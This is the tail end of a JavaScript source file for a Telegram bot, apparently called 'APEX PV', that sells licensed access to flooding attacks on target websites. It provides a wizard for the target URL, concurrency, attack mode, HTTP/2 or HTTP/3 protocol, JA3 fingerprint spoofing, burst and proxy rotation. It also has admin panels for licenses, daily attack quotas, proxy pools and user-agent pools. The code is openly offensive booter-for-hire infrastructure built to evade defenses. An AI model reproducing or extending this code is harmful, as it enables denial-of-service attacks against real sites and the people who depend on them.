            `✅ Admin \`${tgt}\` ${st.step === 'adm_add_admin' ? 'added' : 'removed'}.`,
            { parse_mode: 'Markdown' });
    }
});

// =============================================================
//  CALLBACK HANDLER
// =============================================================
bot.on('callback_query', (q) => {
    const chatId = q.message.chat.id;
    const userId = q.from.id;
    const msgId  = q.message.message_id;
    const data   = q.data;

    const ans  = t => bot.answerCallbackQuery(q.id, { text: t }).catch(() => {});
    const edit = (t, kb) => bot.editMessageText(t, {
        chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: kb,
    }).catch(() => {});

    // ---- main menu ----
    if (data === 'menu_attack') {
        if (!isLicensed(userId)) return ans('❌ No active license');
        userState.set(chatId, { step: 'attack_target', data: {} });
        return edit(`🎯 *New Attack*\n\n🔗 Send target URL:\nExample: \`https://target.com\``);
    }

    if (data === 'menu_active') {
        const list = [...activeAttacks.values()].filter(a => a.userId === userId);
        if (!list.length) return ans('📭 No active attacks');
        const kb = { inline_keyboard: [] };
        let txt = '📊 *Your Active Attacks*\n\n';
        for (const a of list) {
            const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
            txt += `#${a.id} → \`${a.target}\` — ${Math.ceil(rem/60)}m · ${a.mode}\n`;
            kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
        }
        return edit(txt, kb);
    }

    if (data === 'menu_license') {
        const u = getUser(userId);
        const lic = getLicenseForUser(userId);
        resetDailyIfNeeded(u);
        const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
        return edit(
            `🔑 *License Info*\n\n` +
            `🆔 User ID: \`${userId}\`\n` +
            `📝 Key: \`${u.licenseKey || '—'}\`\n` +
            `📅 Activated: ${fmtDate(u.activatedAt)}\n` +
            `⏳ Expires: ${fmtDate(u.expiresAt)}\n\n` +
            `📊 Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
            `⏱ Cooldown: ${lic?.cooldownSeconds ?? 60}s ${cdRemain > 0 ? `(${cdRemain}s left)` : '✅'}\n` +
            `🧵 Concurrent: ${lic?.maxConcurrent ?? 1}\n` +
            `🔥 Total attacks: ${u.totalAttacks || 0}`
        );
    }

    if (data === 'menu_admin' && isAdmin(userId)) {
        return edit('🛡 *Admin Panel*', adminMenuKeyboard());
    }

    // ---- attack wizard callbacks ----
    if (data === 'def_conc') {
        const st = userState.get(chatId);
        if (!st) return ans('Session expired');
        st.data.conc = 50;
        st.data.mode = 'none';
        st.step = 'attack_mode';
        return edit('⚔️ Choose attack mode:', attackModeKeyboard(st.data.mode));
    }

    if (data.startsWith('amd_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_mode') return ans('Session expired');
        st.data.mode = data.slice(4);
        st.data.protocol = 'h2';
        st.step = 'attack_protocol';
        return edit(`⚔️ Mode: *${st.data.mode}*\n\n🧩 Choose protocol:`, attackProtocolKeyboard(st.data.protocol));
    }

    if (data.startsWith('apr_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_protocol') return ans('Session expired');
        st.data.protocol = data.slice(4);
        st.data.options = {
            ja3: true, adaptiveDelay: false, advBurst: false, forceHttp3: false,
            proxyRandom: false, noProxy: false,
        };
        st.step = 'attack_options';
        return edit(
            `⚔️ Mode: *${st.data.mode}* · 🧩 Proto: *${st.data.protocol}*\n\n🔧 Configure options:`,
            attackOptionsKeyboard(st.data)
        );
    }

    if (data.startsWith('opt_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_options') return ans('Session expired');
        const o = st.data.options;
        if (data === 'opt_ja3')          o.ja3          = !o.ja3;
        if (data === 'opt_adaptive')     o.adaptiveDelay = !o.adaptiveDelay;
        if (data === 'opt_advburst')     o.advBurst     = !o.advBurst;
        if (data === 'opt_forceh3')      o.forceHttp3   = !o.forceHttp3;
        if (data === 'opt_proxyrandom')  o.proxyRandom  = !o.proxyRandom;
        if (data === 'opt_usproxy')      o.noProxy      = !o.noProxy;

        if (data === 'opt_cancel') { userState.delete(chatId); return edit('❌ Cancelled.'); }
        if (data === 'opt_confirm') {
            const cfg = { ...st.data };
            userState.delete(chatId);
            startAttack(chatId, userId, cfg, t => edit(t));
            return ans('🚀 Launching...');
        }
        return edit(
            `⚔️ Mode: *${st.data.mode}* · 🧩 Proto: *${st.data.protocol}*\n\n🔧 Configure options:`,
            attackOptionsKeyboard(st.data)
        );
    }

    // ---- stop attack ----
    if (data.startsWith('stop_')) {
        const id = parseInt(data.slice(5));
        const a = activeAttacks.get(id);
        if (!a) return ans('Attack not found');
        if (a.userId !== userId && !isAdmin(userId)) return ans('Permission denied');
        try { a.proc.kill('SIGKILL'); } catch {}
        return ans(`🛑 Attack #${id} stopped`);
    }

    // ---- admin only ----
    if (!isAdmin(userId)) return ans('Access denied');

    if (data === 'adm_stats') {
        const proxyCount = countLines(FILES.proxies);
        const uaCount    = countLines(FILES.uas);
        return edit(
            `📊 *Bot Stats*\n\n` +
            `👥 Users: ${Object.keys(users).length}\n` +
            `🔑 Licenses: ${Object.keys(licenses).length}\n` +
            `⚡ Active attacks: ${activeAttacks.size}\n` +
            `🔥 Total attacks: ${stats.totalAttacks}\n\n` +
            `🌐 Proxies: ${proxyCount}\n` +
            `🖥 UAs: ${uaCount}\n\n` +
            `💾 RAM: ${Math.round(process.memoryUsage().rss / 1048576)} MB\n` +
            `⏱ Uptime: ${Math.floor(process.uptime() / 60)}m`,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_users') {
        const ids = Object.keys(users);
        if (!ids.length) return edit('No users yet.', adminMenuKeyboard());
        let txt = '👥 *Users (last 25)*\n\n';
        ids.slice(-25).forEach(id => {
            const u = users[id];
            const st = u.banned ? '🚫' : (isLicensed(id) ? '✅' : '❌');
            resetDailyIfNeeded(u);
            txt += `${st} \`${id}\` ${u.username ? '@' + esc(u.username) : esc(u.firstName || '')} — ${u.daily?.count ?? 0}\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_gen_license') {
        userState.set(chatId, { step: 'adm_lic_days', data: {} });
        return edit('📅 Access duration (days):');
    }

    if (data === 'adm_licenses') {
        const keys = Object.keys(licenses);
        if (!keys.length) return edit('No licenses yet.', adminMenuKeyboard());
        let txt = '📋 *Licenses (last 10)*\n\n';
        keys.slice(-10).forEach(k => {
            const l = licenses[k];
            txt += `\`${k}\`\n📅 ${l.durationDays}d | 👥 ${l.usedCount}/${l.maxUses === 9999 ? '∞' : l.maxUses} | 📊 ${l.dailyLimit ?? 5}/day | ⏳ ${l.cooldownSeconds ?? 60}s\n\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_stop_all') {
        let n = 0;
        for (const a of activeAttacks.values()) { try { a.proc.kill('SIGKILL'); n++; } catch {} }
        return ans(`🛑 Stopped ${n} attack(s)`);
    }

    if (data === 'adm_proxies_add') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'add' } });
        return edit('➕ *Add Proxies*\n\nSend one per line:\n`host:port`\n`http://user:pass@host:port`\n`host:port:user:pass`\n\nNew proxies will be *merged* into the existing pool.');
    }

    if (data === 'adm_proxies_replace') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'replace' } });
        return edit('♻️ *Replace Proxies*\n\n⚠️ Wipes the pool and uses only what you send.\n\nOne per line:');
    }

    if (data === 'adm_proxies_count') {
        const count = countLines(FILES.proxies);
        let size = 0;
        try { size = fs.statSync(FILES.proxies).size; } catch {}
        return edit(
            `📈 *Proxy Pool*\n\n` +
            `🔢 Total proxies: *${count}*\n` +
            `💾 File size: ${(size/1024).toFixed(2)} KB\n` +
            `📁 Path: \`data/proxy.txt\``,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_ua_add') {
        userState.set(chatId, { step: 'adm_ua', data: { mode: 'add' } });
        return edit('🌐 *Add User-Agents*\n\nSend one UA per line (each line is a full user-agent string).\nNew UAs will be *merged* into the existing pool.');
    }

    if (data === 'adm_ua_replace') {
        userState.set(chatId, { step: 'adm_ua', data: { mode: 'replace' } });
        return edit('♻️ *Replace UAs*\n\n⚠️ Wipes the pool and uses only what you send.\n\nOne per line:');
    }

    if (data === 'adm_ua_count') {
        const count = countLines(FILES.uas);
        let size = 0;
        try { size = fs.statSync(FILES.uas).size; } catch {}
        return edit(
            `📈 *UA Pool*\n\n` +
            `🔢 Total UAs: *${count}*\n` +
            `💾 File size: ${(size/1024).toFixed(2)} KB\n` +
            `📁 Path: \`data/ua.txt\``,
            adminMenuKeyboard()
        );
    }

    if (data === 'adm_broadcast') {
        userState.set(chatId, { step: 'adm_broadcast', data: {} });
        return edit('📢 Send broadcast message:');
    }

    if (data === 'adm_ban')        { userState.set(chatId, { step: 'adm_ban',       data: {} }); return edit('🚫 Numeric user ID to ban:'); }
    if (data === 'adm_unban')      { userState.set(chatId, { step: 'adm_unban',     data: {} }); return edit('✅ Numeric user ID to unban:'); }
    if (data === 'adm_reset_cd')   { userState.set(chatId, { step: 'adm_reset_cd',  data: {} }); return edit('♻️ Numeric user ID to reset cooldown:'); }
    if (data === 'adm_add_admin')  { userState.set(chatId, { step: 'adm_add_admin', data: {} }); return edit('👤 Numeric user ID to promote:'); }
    if (data === 'adm_rm_admin')   { userState.set(chatId, { step: 'adm_rm_admin',  data: {} }); return edit('🗑 Numeric user ID to demote:'); }

    if (data.startsWith('lic_uses_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_uses') return ans('Session expired');
        st.data.uses = data === 'lic_uses_inf' ? 9999 : parseInt(data.replace('lic_uses_', ''));
        st.step = 'adm_lic_daily';
        return edit('📊 Daily attack limit for this license (1 - 1000):');
    }
});

// =============================================================
//  BOOT
// =============================================================
bot.sendMessage(CONFIG.OWNER_ID,
    `✅ *APEX PV Bot Online*\n\n` +
    `⚡ RAM: ${Math.round(process.memoryUsage().rss / 1048576)} MB\n` +
    `👥 Users: ${Object.keys(users).length}\n` +
    `🔑 Licenses: ${Object.keys(licenses).length}\n` +
    `🌐 Proxies: ${countLines(FILES.proxies)}\n` +
    `🖥 UAs: ${countLines(FILES.uas)}`,
    { parse_mode: 'Markdown' }
).catch(() => {});

process.on('uncaughtException',  e => console.error('[uncaught]', e.message));
process.on('unhandledRejection', e => console.error('[rejection]', (e && e.message) || e));

console.log('🤖 APEX PV bot started. Owner:', CONFIG.OWNER_ID);